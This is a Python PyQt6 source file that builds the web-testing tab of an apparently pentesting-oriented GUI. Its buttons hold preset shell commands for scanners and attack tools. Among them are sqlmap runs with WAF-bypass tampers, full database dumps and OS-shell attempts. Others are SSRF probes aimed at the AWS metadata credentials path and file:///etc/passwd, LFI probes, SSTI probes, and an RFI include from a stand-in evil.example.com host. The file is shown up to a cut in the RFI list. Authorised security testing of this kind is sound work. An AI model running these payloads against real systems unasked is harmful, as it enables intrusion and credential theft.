"""
Web Testing tab creator (includes Access Control, CORS, SSRF, etc.).
"""
import os
import re
import sys
import json
import subprocess
from pathlib import Path

from PyQt6 import QtCore, QtGui, QtWidgets
from PyQt6.QtCore import QProcess, Qt, QTimer
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLabel, QLineEdit, QTextEdit, QTabWidget, QGridLayout,
    QGroupBox, QSplitter, QScrollArea, QFileDialog, QMessageBox,
    QComboBox, QFrame, QPlainTextEdit, QProgressBar, QToolButton,
)
from command_bridge.constants import APP_TITLE, APP_VERSION, THEMES, BASE_DIR



class WebTabMixin:
    """Mixin providing web testing tab creator (includes access control, cors, ssrf, etc.)."""

    def create_web_testing_tab(self):
        """Create web application testing tab"""
        widget = QWidget()
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.Shape.NoFrame)
        scroll.setWidget(widget)
        
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(25, 25, 25, 25)
        layout.setSpacing(20)
        
        # Web Scraping Card (collapsible)
        scraping_card = self.create_card("🕸️ Web Scraping")
        self._init_collapsible_groupbox(scraping_card, "web_scraping_card")
        scraping_layout = QGridLayout()
        scraping_layout.setSpacing(12)
        
        # Analyse Security Headers (Python-based, from v2 implementation)
        sec_btn = QPushButton("Analyse Security Headers")
        sec_btn.setObjectName("secondaryButton")
        sec_btn.setMinimumHeight(42)
        sec_btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        sec_btn.clicked.connect(self.analyze_security_headers)
        scraping_layout.addWidget(sec_btn, 0, 0)

        # JWT Decode - prompt for a JWT, decode it using built-in logic,
        # print to the console, and save to the current output directory.
        jwt_btn = QPushButton("JWT Decode")
        jwt_btn.setObjectName("secondaryButton")
        jwt_btn.setMinimumHeight(40)
        jwt_btn.clicked.connect(self.jwt_decode_prompt)
        scraping_layout.addWidget(jwt_btn, 0, 1)
        
        # Retrieve & Analyse JS Files — one button, two stages. The wget
        # command stays editable (depth, host span, file types); the static
        # analysis runs automatically over whatever it pulled down.
        js_btn = self.create_editable_button(
            "Retrieve & Analyse JS Files",
            "web_retrieve_js",
            "wget -r -l 1 -H -t 1 -nd -N -np -A.js -erobots=off {TARGET} -P {SAFE_TARGET}_js_files",
        )
        js_btn.setToolTip(
            "Downloads the site's JavaScript into <target>_js_files/ and then\n"
            "statically analyses it for hardcoded secrets, credentials, API\n"
            "keys, internal endpoints, source maps, DOM-XSS sinks and cloud\n"
            "storage references.\n\n"
            "Right-click to edit the download command (crawl depth, host span,\n"
            "file types). Findings are written to js_analysis_results.txt."
        )
        scraping_layout.addWidget(js_btn, 1, 0)
        
        # Search for known vulnerabilities in discovered JavaScript libraries.
        # Placed to the right of Retrieve JS Files so all buttons align in a
        # neat 2x2 grid and share the same column widths.
        js_issue_btn = QPushButton("Search JavaScript Library Issues")
        js_issue_btn.setObjectName("secondaryButton")
        js_issue_btn.setMinimumHeight(40)
        js_issue_btn.clicked.connect(self.search_js_library_issues)
        scraping_layout.addWidget(js_issue_btn, 1, 1)

        # CMS scanning (Drupal / WordPress) – lightweight buttons in the
        # Web Scraping section for quick platform checks.
        drupal_btn = self.create_editable_button(
            "Drupal Scan (Droopescan)",
            "web_droopescan",
            # Default Droopescan command: single thread (-t 1) and the current
            # target URL. --hide-progressbar suppresses the noisy per-item
            # progress output so only findings/summary reach the console.
            #
            # `command -v droopescan` only proves the shim FILE exists — a
            # pipx-installed tool whose venv points at a since-removed Python
            # (e.g. after a Kali system Python upgrade) still "exists" but
            # fails every run. The exact wording bash uses for that varies by
            # system ("bad interpreter: No such file or directory" is the
            # classic glibc-bash message; some bash builds instead say
            # "cannot execute: required file not found" for the same root
            # cause) so we match both. We run it, tee the output so it still
            # streams live, then grep the captured copy for either failure
            # signature so a broken install gets a clear fix pointer instead
            # of a raw bash error.
            "if command -v droopescan >/dev/null 2>&1; then "
            "LOG=$(mktemp); "
            "droopescan scan drupal -u {TARGET} -t 1 --hide-progressbar 2>&1 | tee \"$LOG\"; "
            "if grep -qE 'bad interpreter|cannot execute|required file not found' \"$LOG\"; then "
            "echo; echo '[!] droopescan is installed but broken: its pipx virtual environment "
            "points at a Python interpreter that no longer exists (typically after a system "
            "Python upgrade). Fix it from the Target Setup tab -> \"Install / Repair Missing "
            "Tools\", or manually: pipx install --force droopescan'; fi; "
            "rm -f \"$LOG\"; "
            "else echo '[!] droopescan is not installed (command not found). Fix it from the "
            "Target Setup tab -> \"Install / Repair Missing Tools\", or manually: "
            "pipx install droopescan'; fi",
        )
        scraping_layout.addWidget(drupal_btn, 2, 0)

        wpscan_btn = self.create_editable_button(
            "WordPress Scan (WPScan)",
            "web_wpscan_full",
            "echo 'Starting WPScan against {TARGET} - this can take some time, please wait...'; "
            "wpscan --url {TARGET} --enumerate vp,vt,tt,cb,dbe,u,m "
            "--plugins-detection mixed --random-user-agent "
            "-o {SAFE_TARGET}_wpscan.txt; "
            "echo; echo '=== WPScan results (from {SAFE_TARGET}_wpscan.txt) ==='; "
            "cat {SAFE_TARGET}_wpscan.txt",
        )
        scraping_layout.addWidget(wpscan_btn, 2, 1)

        # Insecure Redirect testing – quick open redirect probe against the
        # current Target URL using common redirect parameters and payloads.
        insecure_redirect_btn = QPushButton("Insecure Redirect")
        insecure_redirect_btn.setObjectName("secondaryButton")
        insecure_redirect_btn.setMinimumHeight(40)
        insecure_redirect_btn.clicked.connect(self.run_insecure_redirect_scan)
        # Place directly beneath the CMS scan buttons and keep the same
        # column width as the other controls in this area.
        scraping_layout.addWidget(insecure_redirect_btn, 3, 0)

        # JS Recon & Analysis — spider the target, list every JS file, and run
        # static analysis (secrets, endpoints, source maps, DOM-XSS sinks, …).
        js_analysis_btn = QPushButton("JS Recon & Analysis")
        js_analysis_btn.setObjectName("secondaryButton")
        js_analysis_btn.setMinimumHeight(40)
        js_analysis_btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        js_analysis_btn.setToolTip(
            "Spider the target, save every JS file URL to identified_js.txt, then\n"
            "statically analyse them for secrets, credentials, endpoints, source maps,\n"
            "DOM-XSS sinks, cloud storage, JWT/GraphQL/WebSocket usage and more.\n"
            "Detailed findings are written to js_analysis_results.txt."
        )
        js_analysis_btn.clicked.connect(self.run_js_analysis)
        scraping_layout.addWidget(js_analysis_btn, 3, 1)

        # Wildcard SSL Cert — red if the target uses a wildcard cert, green if not.
        wildcard_btn = QPushButton("Wildcard SSL Cert")
        wildcard_btn.setObjectName("secondaryButton")
        wildcard_btn.setMinimumHeight(40)
        wildcard_btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        wildcard_btn.setToolTip(
            "Check whether the target presents a wildcard TLS certificate (e.g. *.example.com).\n"
            "Highlighted red if a wildcard is in use, green if not."
        )
        wildcard_btn.clicked.connect(self.check_wildcard_cert)
        scraping_layout.addWidget(wildcard_btn, 4, 0)

        scraping_card.layout().addLayout(scraping_layout)
        layout.addWidget(scraping_card)

        # Network Scanning Card (collapsible)
        net_card = self.create_card("🔌 Network Scanning")
        self._init_collapsible_groupbox(net_card, "web_net_scan_card")
        net_layout = QGridLayout()
        net_layout.setSpacing(12)

        # Centered "All Network Scans" button spanning both columns at the top:
        # runs every scan below sequentially against the target.
        all_net_btn = QPushButton("⚡  All Network Scans")
        all_net_btn.setObjectName("primaryButton")
        all_net_btn.setMinimumHeight(44)
        all_net_btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        all_net_btn.setToolTip(
            "Run every network scan below one at a time (Quick Nmap → Full Port → UDP →\n"
            "SSL/TLS → Nikto → Nuclei). Each starts only when the previous finishes;\n"
            "output files are saved to the target directory."
        )
        all_net_btn.clicked.connect(self.run_all_network_scans)
        net_layout.addWidget(all_net_btn, 0, 0, 1, 2)

        # Network Scanning tools come from a single shared source (modules/
        # network_scan.py) so the buttons and the "All" runner stay in sync.
        for i, (name, btn_id, cmd) in enumerate(self._network_scan_tools()):
            btn = self.create_editable_button(name, btn_id, cmd)
            net_layout.addWidget(btn, 1 + i // 2, i % 2)

        net_card.layout().addLayout(net_layout)
        layout.addWidget(net_card)

        # Fuzzing Card (collapsible)
        fuzz_card = self.create_card("🔍 Fuzzing & Directory Enumeration")
        self._init_collapsible_groupbox(fuzz_card, "web_fuzzing_card")
        fuzz_layout = QGridLayout()
        fuzz_layout.setSpacing(12)

        # Dirsearch/FFUF/Feroxbuster/Gobuster use the full wordlist-picker
        # workflow: right-click to configure, left-click to run once configured.
        for i, (name, btn_id, default_cmd) in enumerate([
            ("Dirsearch", "web_dirsearch",
             # NOTE: no --filter-threshold — that flag does not exist in
             # dirsearch (confirmed against upstream source) and makes every
             # run fail immediately with "no such option: --filter-threshold".
             # dirsearch already does its own automatic soft-404/wildcard
             # calibration by default, so no extra flag is needed.
             "dirsearch -u '{TARGET}' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
             " -t 10 -i 200 -q -o {SAFE_TARGET}_dirsearch.txt"),
            ("FFUF", "web_ffuf",
             # -ac: ffuf's built-in auto-calibration — probes a couple of
             # random/nonexistent paths up front and filters anything that
             # matches their response signature (the classic "every path
             # returns 200 with the same page" problem).
             "ffuf -u '{TARGET}/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
             " -t 10 -mc 200,204,301,302,307,401,403 -fc 404,500 -ac -s -of json -o {SAFE_TARGET}_ffuf_raw.json; "
             "python3 {CB_DIR}/command_bridge/modules/ffuf_clean.py {SAFE_TARGET}_ffuf_raw.json {SAFE_TARGET}_ffuf.txt"),
            ("Feroxbuster", "web_feroxbuster",
             # No extra flag needed for wildcard/soft-404 filtering — feroxbuster
             # auto-filters those responses by default (-D/--dont-filter turns
             # it off, which we never pass). -q/--quiet hides feroxbuster's
             # banner and live-updating progress bar (request count/rate)
             # from flooding the console; discovered results still print.
             "feroxbuster --url {TARGET} -t 10 -q"
             " -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
             " -o {SAFE_TARGET}_ferox_results.txt"),
            ("Gobuster", "web_gobuster",
             # No --wildcard: that flag does not exist in `gobuster dir` mode
             # and makes gobuster refuse to start at all ("flag provided but
             # not defined: -wildcard"). -b (status code blacklist) already
             # covers what this was trying to do. gobuster dir also has no
             # ffuf-style auto-calibration, so this probes one guaranteed-
             # nonexistent path with curl first and, if the server answers
             # with content (a catch-all/soft-404 responder), feeds that
             # response's byte size into gobuster's own --exclude-length.
             'PROBE_PATH="cb_probe_$(date +%s%N)_$$_definitely_not_real"; '
             "PROBE_LEN=$(curl -sk -m 10 -o /dev/null -w '%{size_download}' "
             '"{TARGET}/$PROBE_PATH" 2>/dev/null); '
             'GB_EXCL=""; '
             'if echo "$PROBE_LEN" | grep -qE "^[0-9]+$" && [ "$PROBE_LEN" -gt 0 ]; then '
             'echo "[*] Calibration probe got a ${PROBE_LEN}-byte response for a '
             'nonexistent path -- looks like a catch-all/soft-404 responder, '
             'excluding that size via --exclude-length."; '
             'GB_EXCL="--exclude-length $PROBE_LEN"; '
             'fi; '
             "gobuster dir -u {TARGET}"
             " -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
             " -t 10 -b 404,500 $GB_EXCL --no-error --expanded -q -o {SAFE_TARGET}_gobuster.txt"),
        ]):
            btn = QPushButton(name)
            btn.setObjectName("secondaryButton")
            btn.setMinimumHeight(42)
            btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
            btn.clicked.connect(
                lambda checked, b=btn, bid=btn_id, cmd=default_cmd:
                    self._on_fuzzing_button_clicked(b, bid, cmd)
            )
            btn.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
            btn.customContextMenuRequested.connect(
                lambda pos, b=btn, bid=btn_id, cmd=default_cmd:
                    self.show_command_editor(b, bid, cmd)
            )
            fuzz_layout.addWidget(btn, i // 2, i % 2)

        smartfuzz_btn = QPushButton("SmartFuzz")
        smartfuzz_btn.setObjectName("secondaryButton")
        smartfuzz_btn.setMinimumHeight(42)
        smartfuzz_btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        smartfuzz_btn.setToolTip(
            "Adaptive directory enumeration: auto-detects the server architecture and\n"
            "switches to a matching wordlist mid-scan. Right-click to set custom\n"
            "Nginx / Apache / IIS / Tomcat / CMS wordlist paths."
        )
        smartfuzz_btn.clicked.connect(self.run_smartfuzz_with_auth)
        smartfuzz_btn.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        smartfuzz_btn.customContextMenuRequested.connect(self.show_smartfuzz_menu)
        self.smartfuzz_btn = smartfuzz_btn
        fuzz_layout.addWidget(smartfuzz_btn, 2, 0)

        param_dev_btn = QPushButton("Parameter Finder – Dev Sites")
        param_dev_btn.setObjectName("secondaryButton")
        param_dev_btn.setMinimumHeight(42)
        param_dev_btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        param_dev_btn.setToolTip(
            "Historical parameter discovery (param_finder.sh --mode dev): pulls\n"
            "URLs from waybackurls + gau (archived data only, no live requests to\n"
            "the target), filters for ones carrying a query string, then extracts\n"
            "every unique parameter name (e.g. ?id=, ?redirect=, ?debug=) into a\n"
            "report — a starting point for param-based fuzzing/tampering.\n\n"
            "Note: this does NOT auto-detect the server and switch wordlists —\n"
            "that adaptive behaviour is what the SmartFuzz button does."
        )
        param_dev_btn.clicked.connect(lambda: self.run_param_finder('dev'))
        fuzz_layout.addWidget(param_dev_btn, 2, 1)

        param_live_btn = QPushButton("Parameter Finder – Live Sites")
        param_live_btn.setObjectName("secondaryButton")
        param_live_btn.setMinimumHeight(42)
        param_live_btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        param_live_btn.setToolTip(
            "Live parameter discovery (param_finder.sh --mode live): actively\n"
            "crawls the target with katana (depth 3, generates real requests),\n"
            "supplemented with gau, then extracts every unique query-string\n"
            "parameter name from the URLs found into a report — a starting point\n"
            "for param-based fuzzing/tampering.\n\n"
            "Note: this does NOT auto-detect the server and switch wordlists —\n"
            "that adaptive behaviour is what the SmartFuzz button does."
        )
        param_live_btn.clicked.connect(lambda: self.run_param_finder('live'))
        fuzz_layout.addWidget(param_live_btn, 3, 0)

        fuzz_card.layout().addLayout(fuzz_layout)
        layout.addWidget(fuzz_card)

        # XSS Testing Card (collapsible)
        xss_card = self.create_card("⚡ XSS Testing")
        self._init_collapsible_groupbox(xss_card, "web_xss_card")
        xss_layout = QGridLayout()
        xss_layout.setSpacing(12)
        
        xss_tools = [
            # gau expects a bare domain, not a full URL with a scheme — pass
            # {TARGET_HOST} (scheme/path already stripped) rather than
            # {TARGET}, matching how gau is invoked everywhere else in the app.
            ("XSS Pipeline", "web_xss_pipeline", "gau {TARGET_HOST} | gf xss | uro | Gxss | kxss | tee {SAFE_TARGET}_xss.txt"),
            # --no-spinner: without it, dalfox's spinner animation writes
            # carriage-return updates straight to the console, which our
            # console widget renders as a flood of separate lines.
            ("Dalfox Scan", "web_dalfox", "dalfox url {TARGET} --skip-bav --no-spinner -o {SAFE_TARGET}_dalfox.txt"),
            # Send the target into httpx on stdin and filter for HTML content-types.
            # Kali ships ProjectDiscovery's httpx as "httpx-toolkit" (a bare
            # "httpx" on PATH is usually the unrelated Python HTTP client), so
            # the packaged name is what gets called here and what the installer
            # guarantees is present.
            ("Content-Type Filter", "web_ct_filter", "echo {TARGET} | httpx-toolkit -ct -silent | grep 'text/html' | tee {SAFE_TARGET}_ct.txt"),
            # Paramspider always writes a ./results/<domain>.txt file internally.
            # We normalise the domain via {TARGET_HOST}, auto-create the results
            # folder inside the configured output directory, and capture stdout
            # to {SAFE_TARGET}_params.txt so the user only deals with the file
            # in their chosen Target Setup output path.
            ("Parameter Discovery", "web_paramspider", "if command -v paramspider >/dev/null 2>&1; then paramspider -d {TARGET_HOST} | tee {SAFE_TARGET}_params.txt; else echo 'Error: paramspider is not installed (command not found).'; fi"),
        ]
        
        for i, (name, btn_id, cmd) in enumerate(xss_tools):
            btn = self.create_editable_button(name, btn_id, cmd)
            xss_layout.addWidget(btn, i // 2, i % 2)

        xss_card.layout().addLayout(xss_layout)
        layout.addWidget(xss_card)
        
        # SQL Injection Card - Expanded (collapsible)
        sql_card = self.create_card("🛡️ SQL Injection Testing")
        self._init_collapsible_groupbox(sql_card, "web_sqli_card")
        sql_layout = QVBoxLayout()
        sql_layout.setSpacing(15)
        
        # SQLMap from structured HTTP request (Burp-style) – put this FIRST in the card
        sql_http_label = QLabel("📥 SQLMap from HTTP Request (Burp-style)")
        sql_http_label.setObjectName("sectionDivider")
        sql_layout.addWidget(sql_http_label)

        self.sqlmap_http_btn = QPushButton("Extensive SQLMap (HTTP Request)")
        # Full-width feature action, same treatment as "All Network Scans":
        # centred label and the accent fill, so it reads as the headline
        # control of this card rather than one more item in the grid.
        self.sqlmap_http_btn.setObjectName("primaryButton")
        self.sqlmap_http_btn.setMinimumHeight(44)
        self.sqlmap_http_btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        # Use a small wrapper so any exceptions in the workflow are surfaced
        # to the console / user instead of failing silently.
        self.sqlmap_http_btn.clicked.connect(self.handle_sqlmap_http_click)
        self.sqlmap_http_btn.setToolTip(
            "Left-click: the full extensive run — every technique, every "
            "parameter. Thorough, and slow.\n"
            "Right-click: a fast confirmation scan, or build your own with "
            "the depth, enumeration and target parameter you choose."
        )
        self.sqlmap_http_btn.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.sqlmap_http_btn.customContextMenuRequested.connect(self.show_sqlmap_http_menu)
        sql_layout.addWidget(self.sqlmap_http_btn)

        # Basic SQL Injection section
        sql_basic_label = QLabel("🛡️ Basic SQL Injection Scans")
        sql_basic_label.setObjectName("sectionDivider")
        sql_layout.addWidget(sql_basic_label)
        
        sql_basic_grid = QGridLayout()
        sql_basic_grid.setSpacing(12)
        
        sql_basic_tools = [
            ("SQLMap Auto", "web_sqlmap_auto", "sqlmap -u {TARGET} --batch --level=3 --output-dir={SAFE_TARGET}_sqlmap"),
            # ghauri has no --log flag; it rejects the command outright. Tee the
            # session output instead so the run is still captured to disk.
            ("Ghauri Scan", "web_ghauri",
             "ghauri -u {TARGET} --batch --dbs 2>&1 | tee {SAFE_TARGET}_ghauri.log"),
            ("SQLi Filter", "web_sqli_filter", "gf sqli | uro | tee {SAFE_TARGET}_sqli_urls.txt"),
            ("Error-Based Scan", "web_sqlmap_error", "sqlmap -u {TARGET} --batch --technique=E --output-dir={SAFE_TARGET}_sqlmap_error"),
            ("Boolean-Based Blind", "web_sqlmap_boolean", "sqlmap -u {TARGET} --batch --technique=B --level=5 --output-dir={SAFE_TARGET}_sqlmap_boolean"),
            ("Time-Based Blind", "web_sqlmap_time", "sqlmap -u {TARGET} --batch --technique=T --level=5 --risk=3 --output-dir={SAFE_TARGET}_sqlmap_time"),
        ]
        
        for i, (name, btn_id, cmd) in enumerate(sql_basic_tools):
            btn = self.create_editable_button(name, btn_id, cmd)
            sql_basic_grid.addWidget(btn, i // 2, i % 2)
        
        sql_layout.addLayout(sql_basic_grid)
        
        # WAF Bypass / Tamper Scripts section
        sql_tamper_label = QLabel("🔥 WAF Bypass & Tamper Scripts")
        sql_tamper_label.setObjectName("sectionDivider")
        sql_layout.addWidget(sql_tamper_label)
        
        sql_tamper_grid = QGridLayout()
        sql_tamper_grid.setSpacing(12)
        
        sql_tamper_tools = [
            ("Space2Comment", "web_tamper_space2comment", "sqlmap -u {TARGET} --batch --tamper=space2comment --level=3 --output-dir={SAFE_TARGET}_tamper_s2c"),
            ("Between + Random Case", "web_tamper_between", "sqlmap -u {TARGET} --batch --tamper=between,randomcase --level=3 --output-dir={SAFE_TARGET}_tamper_between"),
            ("Charencode", "web_tamper_charencode", "sqlmap -u {TARGET} --batch --tamper=charencode --level=3 --output-dir={SAFE_TARGET}_tamper_char"),
            ("Base64 Encode", "web_tamper_base64", "sqlmap -u {TARGET} --batch --tamper=base64encode --level=3 --output-dir={SAFE_TARGET}_tamper_b64"),
            ("Unicode Escape", "web_tamper_unicode", "sqlmap -u {TARGET} --batch --tamper=chardoubleencode,charunicodeencode --level=3 --output-dir={SAFE_TARGET}_tamper_unicode"),
            ("Custom WAF Bypass", "web_tamper_custom", "sqlmap -u {TARGET} --batch --tamper=space2comment,between,randomcase,charencode --level=5 --risk=3 --output-dir={SAFE_TARGET}_tamper_custom"),
        ]
        
        for i, (name, btn_id, cmd) in enumerate(sql_tamper_tools):
            btn = self.create_editable_button(name, btn_id, cmd)
            sql_tamper_grid.addWidget(btn, i // 2, i % 2)
        
        sql_layout.addLayout(sql_tamper_grid)
        
        # Advanced SQL Injection section
        sql_advanced_label = QLabel("⚡ Advanced Techniques")
        sql_advanced_label.setObjectName("sectionDivider")
        sql_layout.addWidget(sql_advanced_label)
        
        sql_advanced_grid = QGridLayout()
        sql_advanced_grid.setSpacing(12)
        
        sql_advanced_tools = [
            ("Union-Based", "web_sqlmap_union", "sqlmap -u {TARGET} --batch --technique=U --level=5 --risk=3 --output-dir={SAFE_TARGET}_sqlmap_union"),
            ("Stacked Queries", "web_sqlmap_stacked", "sqlmap -u {TARGET} --batch --technique=S --level=5 --risk=3 --output-dir={SAFE_TARGET}_sqlmap_stacked"),
            ("Second Order SQLi", "web_sqlmap_secondorder", "sqlmap -u {TARGET} --batch --second-order=http://secondorder.url --output-dir={SAFE_TARGET}_sqlmap_2ndorder"),
            ("DBMS Fingerprint", "web_sqlmap_fingerprint", "sqlmap -u {TARGET} --batch --fingerprint --output-dir={SAFE_TARGET}_sqlmap_fingerprint"),
            ("Full DB Dump", "web_sqlmap_dump", "sqlmap -u {TARGET} --batch --dump-all --exclude-sysdbs --output-dir={SAFE_TARGET}_sqlmap_dump"),
            ("OS Shell Attempt", "web_sqlmap_osshell", "sqlmap -u {TARGET} --batch --os-shell --output-dir={SAFE_TARGET}_sqlmap_osshell"),
        ]
        
        for i, (name, btn_id, cmd) in enumerate(sql_advanced_tools):
            btn = self.create_editable_button(name, btn_id, cmd)
            sql_advanced_grid.addWidget(btn, i // 2, i % 2)
        
        sql_layout.addLayout(sql_advanced_grid)

        sql_card.layout().addLayout(sql_layout)
        layout.addWidget(sql_card)
        
        # Access Control & Authorization Section
        access_header = QLabel("🔐 ACCESS CONTROL & AUTHORIZATION")
        access_header.setStyleSheet("font-size: 20px; font-weight: bold; margin-top: 20px; margin-bottom: 10px;")
        layout.addWidget(access_header)
        
        # 403 Bypass Card - HIGHLIGHTED (collapsible)
        bypass_card = self.create_card("🚨 403 Forbidden Bypass Testing")
        self._init_collapsible_groupbox(bypass_card, "web_403_bypass_card")
        bypass_layout = QVBoxLayout()
        bypass_layout.setSpacing(15)
        
        bypass_desc = QLabel("Test various techniques to bypass 403 Forbidden responses and access restricted resources.")
        bypass_desc.setObjectName("autoDesc")
        bypass_desc.setWordWrap(True)
        bypass_layout.addWidget(bypass_desc)
        
        # 403 Bypass buttons
        bypass_grid = QGridLayout()
        bypass_grid.setSpacing(12)
        
        # Check if bypass script exists (user can override this path via the
        # right-click "Browse for 403 bypass script…" option on the
        # "403 Bypass Scan" button). We default to a common location under the
        # current user's home directory.
        default_bypass_path = (
            Path.home()
            / "Downloads" / "Pentesting" / "scripts" / "Bypass" / "403Bypass"
            / "bypass-403" / "bypass-403.sh"
        )
        if default_bypass_path.exists():
            bypass_cmd = f"bash {default_bypass_path} {{target}}"
        else:
            bypass_cmd = f"echo 'Error: bypass-403 script not found at {default_bypass_path}'"
        
        bypass_tools = [
            ("403 Bypass Scan", "access_403_bypass", bypass_cmd),
            # -sk: every other curl button in this tab is silent+insecure;
            # this one was missing both, so curl's live transfer progress
            # meter was printing straight to the console.
            ("Header Injection Test", "access_header_inject", "curl -sk -m 10 -H 'X-Forwarded-For: 127.0.0.1' {TARGET} -o {SAFE_TARGET}_header_test.txt"),
        ]
        
        for i, (name, btn_id, cmd) in enumerate(bypass_tools):
            btn = self.create_editable_button(name, btn_id, cmd)
            btn.setMinimumHeight(44)
            bypass_grid.addWidget(btn, i // 2, i % 2)
            
        bypass_layout.addLayout(bypass_grid)
        bypass_card.layout().addLayout(bypass_layout)
        layout.addWidget(bypass_card)
        
        # NOTE: the old "Authentication & Session Testing" card (button:
        # "OAuth Testing", button_id "access_oauth") was removed — its only
        # content ran `oauth-scan {TARGET} -o ...`, which is not a real
        # installed tool on Kali, so the button always failed. Removed
        # rather than fixed since there's no equivalent stock CLI tool to
        # point it at; re-add if/when a real OAuth testing script exists.

        # CORS Testing Card (collapsible)
        cors_card = self.create_card("🌐 CORS Misconfiguration")
        self._init_collapsible_groupbox(cors_card, "web_cors_card")
        cors_layout = QGridLayout()
        cors_layout.setSpacing(12)

        cors_btn = self.create_editable_button(
            "CORS Misconfiguration Scan",
            "access_corsy",
            "corsy -u '{TARGET}' -o {SAFE_TARGET}_corsy.txt",
        )
        cors_layout.addWidget(cors_btn, 0, 0)

        cors_card.layout().addLayout(cors_layout)
        layout.addWidget(cors_card)

        # ── SSRF Testing ─────────────────────────────────────────────────────
        ssrf_card = self.create_card("🔄 Server-Side Request Forgery (SSRF)")
        self._init_collapsible_groupbox(ssrf_card, "web_ssrf_card")
        ssrf_layout = QGridLayout()
        ssrf_layout.setSpacing(12)

        ssrf_tools = [
            ("SSRF AWS Metadata", "web_ssrf_aws",
             "curl -sk -m 5 '{TARGET}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>&1 | tee {SAFE_TARGET}_ssrf_aws.txt"),
            ("SSRF File Read", "web_ssrf_file",
             "curl -sk -m 5 '{TARGET}?url=file:///etc/passwd' 2>&1 | tee {SAFE_TARGET}_ssrf_file.txt"),
            ("SSRF Localhost Probe", "web_ssrf_local",
             "curl -sk -m 5 '{TARGET}?url=http://127.0.0.1/' 2>&1 | tee {SAFE_TARGET}_ssrf_local.txt"),
            # ssrfmap needs a captured raw HTTP request on disk as request.txt
            # — there was no such file and nothing to create one, so this
            # always failed with an unhelpful "file not found" from ssrfmap
            # itself. Check for it first and point the user at how to get one.
            ("SSRFmap Scan", "web_ssrfmap",
             "if command -v ssrfmap >/dev/null 2>&1; then if [ -f request.txt ]; then ssrfmap -r request.txt -p url; "
             "else echo '[!] ssrfmap needs a captured raw HTTP request saved as request.txt in this output directory "
             "(e.g. Burp \"Copy as HTTP request\" -> paste into request.txt), then re-run.'; fi; "
             "else echo '[!] ssrfmap not installed'; fi"),
            ("Nuclei SSRF Templates", "web_ssrf_nuclei",
             "nuclei -u '{TARGET}' -tags ssrf -o {SAFE_TARGET}_ssrf_nuclei.txt"),
        ]

        for i, (name, btn_id, cmd) in enumerate(ssrf_tools):
            btn = self.create_editable_button(name, btn_id, cmd)
            ssrf_layout.addWidget(btn, i // 2, i % 2)

        ssrf_card.layout().addLayout(ssrf_layout)
        layout.addWidget(ssrf_card)

        # ── SSTI Testing ─────────────────────────────────────────────────────
        ssti_card = self.create_card("📝 Server-Side Template Injection (SSTI)")
        self._init_collapsible_groupbox(ssti_card, "web_ssti_card")
        ssti_layout = QGridLayout()
        ssti_layout.setSpacing(12)

        ssti_tools = [
            ("SSTI Detection Probe", "web_ssti_detect",
             "curl -sk -m 5 -d 'name={{7*7}}' '{TARGET}' | grep -o '49' | head -5"),
            # tplmap has been unmaintained since the Python 2 era and is in no
            # package repository, so the installer provides SSTImap -- its
            # actively maintained successor, built on tplmap's codebase and
            # driven the same way. An existing tplmap is still honoured first
            # for anyone who already has one working.
            ("SSTI Scan (SSTImap)", "web_tplmap",
             "if command -v tplmap >/dev/null 2>&1; then tplmap -u '{TARGET}' 2>&1 | tee {SAFE_TARGET}_tplmap.txt; "
             "elif command -v sstimap >/dev/null 2>&1; then sstimap -u '{TARGET}' 2>&1 | tee {SAFE_TARGET}_sstimap.txt; "
             "else echo '[!] Neither sstimap nor tplmap is installed -- run Install / Repair Missing Tools on the Target tab'; fi"),
            ("SSTI Jinja2 Basic PoC", "web_ssti_jinja2",
             "curl -sk -m 10 -d 'name={{7*7}}' '{TARGET}' | head -100"),
            ("Nuclei SSTI Templates", "web_ssti_nuclei",
             "nuclei -u '{TARGET}' -tags ssti -o {SAFE_TARGET}_ssti_nuclei.txt"),
        ]

        for i, (name, btn_id, cmd) in enumerate(ssti_tools):
            btn = self.create_editable_button(name, btn_id, cmd)
            ssti_layout.addWidget(btn, i // 2, i % 2)

        ssti_card.layout().addLayout(ssti_layout)
        layout.addWidget(ssti_card)

        # ── Path Traversal & File Inclusion ───────────────────────────────────
        lfi_card = self.create_card("📂 Path Traversal & File Inclusion (LFI/RFI)")
        self._init_collapsible_groupbox(lfi_card, "web_lfi_card")
        lfi_layout = QGridLayout()
        lfi_layout.setSpacing(12)

        lfi_tools = [
            ("LFI Basic Probe", "web_lfi_basic",
             "curl -sk -m 5 '{TARGET}?file=../etc/passwd' | grep -q root && echo '[VULN]' || echo '[safe]'"),
            ("LFI Encoded Probe", "web_lfi_enc",
             "curl -sk -m 5 '{TARGET}?file=%2e%2e%2fetc%2fpasswd' | grep -q root && echo '[VULN]' || echo '[safe]'"),
            # lfimap takes its target via -U, not as a bare positional arg —
            # without it, lfimap's argument parser rejects the command outright.
            ("LFImap Scan", "web_lfisuite",
             "if command -v lfimap >/dev/null 2>&1; then lfimap -U '{TARGET}?file=test' -a 2>&1 | tee {SAFE_TARGET}_lfimap.txt; else echo '[!] lfimap not installed: pip install lfimap'; fi"),
            ("RFI Remote Include Test", "web_rfi",
             "curl -sk -m 5 '{TARGET}?file=http://evil.example.com/shell.txt' | head -200"),
